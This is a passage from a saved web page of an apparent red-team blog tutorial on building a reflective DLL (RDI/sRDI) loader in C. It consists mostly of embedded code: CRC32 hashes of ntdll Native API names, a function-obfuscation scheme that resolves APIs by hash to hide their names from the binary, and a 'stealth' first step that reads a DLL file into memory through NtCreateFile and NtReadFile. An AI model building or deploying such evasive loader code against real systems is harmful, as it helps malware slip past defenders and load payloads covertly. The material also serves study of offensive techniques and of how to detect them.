        </tr>
        <tr>
          <td id="file-structs-h-L114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="114"></td>
          <td id="file-structs-h-LC114" class="blob-code blob-code-inner js-file-line">} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/221bb0a44643a9cf7425405ddc1c4a4c/raw/cf8f99e14ee450bce8cf9bc319235024a49050d8/structs.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/221bb0a44643a9cf7425405ddc1c4a4c#file-structs-h">
          structs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Now we need to define the function name hashes for the function names we currently want to use.  We can achieve this by using a small <code>printf</code> function along with our <code>HASH</code> macro and then exit as seen below.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-13.png" class="kg-image" alt="" loading="lazy" width="2000" height="1395" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-13.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-13.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-13.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-13.png 2400w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>You then take those hashes and define them in the <code>peb.h</code> file so we can use them in the coming code.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/d59196316a698bc10add1e71a017c972.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121786516" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="peb.h">
        <tbody><tr>
          <td id="file-peb-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-h-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>defs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-h-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SEED</span> <span class="pl-c1">0xDEADDEAD</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">HASH</span>(<span class="pl-v">API</span>)(crc32b((<span class="pl-c1">uint8_t</span> *)API))</td>
        </tr>
        <tr>
          <td id="file-peb-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-h-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-h-LC7" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RtlInitUnicodeString_CRC32b</span>         <span class="pl-c1">0xe17f353f</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-h-LC8" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCreateFile_CRC32b</span>                 <span class="pl-c1">0x962c4683</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-h-LC9" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtAllocateVirtualMemory_CRC32b</span>      <span class="pl-c1">0xec50426f</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-peb-h-LC10" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtQueryInformationFile_CRC32b</span>       <span class="pl-c1">0xb54956cb</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-peb-h-LC11" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtReadFile_CRC32b</span>                   <span class="pl-c1">0xab569438</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-peb-h-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-peb-h-LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-k">extern</span> <span class="pl-k">void</span> *<span class="pl-en">get_ntdll</span>();</td>
        </tr>
        <tr>
          <td id="file-peb-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-peb-h-LC14" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-peb-h-LC15" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> <span class="pl-en">crc32b</span>(<span class="pl-k">const</span> <span class="pl-c1">uint8_t</span> *str);</td>
        </tr>
        <tr>
          <td id="file-peb-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-peb-h-LC16" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-peb-h-LC17" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">get_proc_address_by_hash</span>(<span class="pl-k">void</span> *dll_address, <span class="pl-c1">uint32_t</span> function_hash);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/d59196316a698bc10add1e71a017c972/raw/3273edc05d834a935b1b607315bd56fdb6a86f88/peb.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/d59196316a698bc10add1e71a017c972#file-peb-h">
          peb.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><p></p><h2 id="function-obfuscation">Function Obfuscation</h2><p>Now that the function hashes and definitions are created, I will show you how I am obfuscating the function pointers, and hiding the function names in the binary.</p><p>In the following example, there are three steps to using a Native API function when using function obfuscation.</p><!--kg-card-begin: html--><p><b>Step 1</b>: Make sure there is a pointer to the ntdll.dll base address, if not create it with <code>get_ntdll()</code>. Next, create a void pointer of the function name, and resolve the base address using <code>get_proc_address_by_hash</code> and using the hash we created in the previous steps as seen below.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/d55ee0d0dfca91bb94cceb006abcc689.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121800884" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-obfs-1-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="obfs-1.c">
        <tbody><tr>
          <td id="file-obfs-1-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-obfs-1-c-LC1" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-obfs-1-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-obfs-1-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_ntdll = get_ntdll();</td>
        </tr>
        <tr>
          <td id="file-obfs-1-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-obfs-1-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/d55ee0d0dfca91bb94cceb006abcc689/raw/166dcf421931a13b492decead21a3f9ea70a6fe4/obfs-1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/d55ee0d0dfca91bb94cceb006abcc689#file-obfs-1-c">
          obfs-1.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above pointers currently point to the base address to ntdll.dll, and the base address of <code>NtCreateFile</code> respectively.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><b>Step 2</b>: Cast the function pointer to its definition type.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/be83e6131fb7198cc4cb151c21f66fd4.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121800900" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-obfs-2-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="obfs-2.c">
        <tbody><tr>
          <td id="file-obfs-2-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-obfs-2-c-LC1" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-obfs-2-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-obfs-2-c-LC2" class="blob-code blob-code-inner js-file-line">NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/be83e6131fb7198cc4cb151c21f66fd4/raw/f08d23ca87ee7d2da59ee71106b4b55e4e460d85/obfs-2.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/be83e6131fb7198cc4cb151c21f66fd4#file-obfs-2-c">
          obfs-2.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code is casting the new variable <code>g_nt_create_file</code> as type <code>NtCreateFile_t</code> as we defined it <code>defs.h</code>.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><strong>Step 3</strong>: Use the function as normal, using our new function <code>g_nt_create_file</code>.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/ba6b7d74aee1f965d63ec9a4c7dcd58b.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121800998" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-obfs-3-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="obfs-3.c">
        <tbody><tr>
          <td id="file-obfs-3-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-obfs-3-c-LC1" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-obfs-3-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-obfs-3-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_create_file(&amp;h_file, SYNCHRONIZE | GENERIC_READ, &amp;obj_attrs, &amp;io_status_block, <span class="pl-c1">0</span>, <span class="pl-c1">0x0000080</span>, <span class="pl-c1">0x0000007</span>, FILE_OPEN_IF, <span class="pl-c1">0x0000020</span>, <span class="pl-c1">0x0000000</span>, <span class="pl-c1">0</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-obfs-3-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-obfs-3-c-LC3" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-obfs-3-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-obfs-3-c-LC4" class="blob-code blob-code-inner js-file-line">        </td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/ba6b7d74aee1f965d63ec9a4c7dcd58b/raw/40d11b9e208ff84a0dae13e94d7d0f3e2e3a651a/obfs-3.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/ba6b7d74aee1f965d63ec9a4c7dcd58b#file-obfs-3-c">
          obfs-3.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above command is identical to the actual <code>NtCreateFile</code> function, but using a obfuscated function pointer.</p><!--kg-card-end: html--><p>Now that we have covered both the helper functions and how to apply function obfuscation, we can start working on <em>Step 1</em> of our new RDI loader.</p><hr><p></p><h3 id="stealth-step-1">Stealth Step 1</h3><p>In this step, the binary representation of the DLL file is read from the file...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/be68a695d23c7181aee5c5debf6464d3.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801089" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_0-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_0.c">
        <tbody><tr>
          <td id="file-stealth_step_0-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_0-c-LC1" class="blob-code blob-code-inner js-file-line">NTSTATUS status;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_0-c-LC2" class="blob-code blob-code-inner js-file-line">UNICODE_STRING dll_file;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_0-c-LC3" class="blob-code blob-code-inner js-file-line">WCHAR w_file_path[<span class="pl-c1">100</span>] = L<span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\\</span>??<span class="pl-cce">\\\\</span>C:<span class="pl-cce">\\</span>Temp<span class="pl-cce">\\</span>dll_poc.dll<span class="pl-pds">"</span></span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_0-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_ntdll = get_ntdll();</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_0-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_0-c-LC6" class="blob-code blob-code-inner js-file-line">RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_0-c-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-en">g_rtl_init_unicode_string</span>(&amp;dll_file, w_file_path);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_0-c-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_0-c-LC9" class="blob-code blob-code-inner js-file-line">OBJECT_ATTRIBUTES obj_attrs;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_0-c-LC10" class="blob-code blob-code-inner js-file-line">IO_STATUS_BLOCK io_status_block;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_0-c-LC11" class="blob-code blob-code-inner js-file-line"><span class="pl-en">InitializeObjectAttributes</span>(&amp;obj_attrs, &amp;dll_file, <span class="pl-c1">0x00000040L</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_0-c-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-stealth_step_0-c-LC13" class="blob-code blob-code-inner js-file-line">HANDLE h_file = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-stealth_step_0-c-LC14" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-stealth_step_0-c-LC15" class="blob-code blob-code-inner js-file-line">NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-stealth_step_0-c-LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_create_file(&amp;h_file, SYNCHRONIZE | GENERIC_READ, &amp;obj_attrs, &amp;io_status_block, <span class="pl-c1">0</span>, <span class="pl-c1">0x0000080</span>, <span class="pl-c1">0x0000007</span>, FILE_OPEN_IF, <span class="pl-c1">0x0000020</span>, <span class="pl-c1">0x0000000</span>, <span class="pl-c1">0</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-stealth_step_0-c-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-stealth_step_0-c-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-stealth_step_0-c-LC19" class="blob-code blob-code-inner js-file-line">FILE_STANDARD_INFORMATION file_standard_info;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-stealth_step_0-c-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-stealth_step_0-c-LC21" class="blob-code blob-code-inner js-file-line">NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-stealth_step_0-c-LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_query_information_file(h_file, &amp;io_status_block, &amp;file_standard_info, <span class="pl-k">sizeof</span>(FILE_STANDARD_INFORMATION), FileStandardInformation)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-stealth_step_0-c-LC23" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> -<span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-stealth_step_0-c-LC24" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-stealth_step_0-c-LC25" class="blob-code blob-code-inner js-file-line"><span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> dll_size = file_standard_info.EndOfFile.QuadPart;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-stealth_step_0-c-LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *dll_bytes = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-stealth_step_0-c-LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-stealth_step_0-c-LC28" class="blob-code blob-code-inner js-file-line">NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-stealth_step_0-c-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_allocate_virtual_memory(((HANDLE) -<span class="pl-c1">1</span>), &amp;dll_bytes, <span class="pl-c1">0</span>, &amp;dll_size, MEM_COMMIT, PAGE_READWRITE)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-stealth_step_0-c-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> -<span class="pl-c1">3</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-stealth_step_0-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-stealth_step_0-c-LC32" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-stealth_step_0-c-LC33" class="blob-code blob-code-inner js-file-line">NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-stealth_step_0-c-LC34" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_read_file(h_file, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, &amp;io_status_block, dll_bytes, dll_size, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_0-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-stealth_step_0-c-LC35" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> -<span class="pl-c1">4</span>;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/be68a695d23c7181aee5c5debf6464d3/raw/0d804836da9b11e056f053520510e0af0e671cc8/stealth_step_0.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/be68a695d23c7181aee5c5debf6464d3#file-stealth_step_0-c">
          stealth_step_0.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
